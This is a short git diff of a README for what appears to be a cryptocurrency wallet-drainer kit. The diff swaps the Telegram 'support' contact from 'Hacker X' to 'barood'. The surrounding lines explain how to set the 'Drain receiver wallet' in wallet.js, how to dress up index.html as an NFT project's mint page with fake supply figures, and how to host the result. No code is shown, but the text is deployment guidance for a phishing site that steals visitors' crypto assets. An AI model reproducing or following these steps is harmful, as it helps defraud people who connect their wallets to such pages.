@@ -25,11 +25,11 @@ You need to edit the __**wallet.js**__ file to change the Drain receiver wallet.
 - Open index.html, to edit the project discord & twitter link, how many mints left or total supply and the project name also.
 - *After it, you're done. You only need to host the website to any hosting service*
 
-To get instant support, contact us on  [Hacker X](https://t.me/cryptohacker909)
+To get instant support, contact us on  [barood](https://t.me/b4rud)
 
 ## ` 🌊 Socials `
 
-- Telegram: [Hacker X](https://t.me/cryptohacker909)
+- Telegram: [barood](https://t.me/b4rud)
 
 ##### Please ⭐ the repo to support this project & follow next updates
 ![star](https://cdn.discordapp.com/attachments/975036883958636557/975057102097743973/unknown.png)
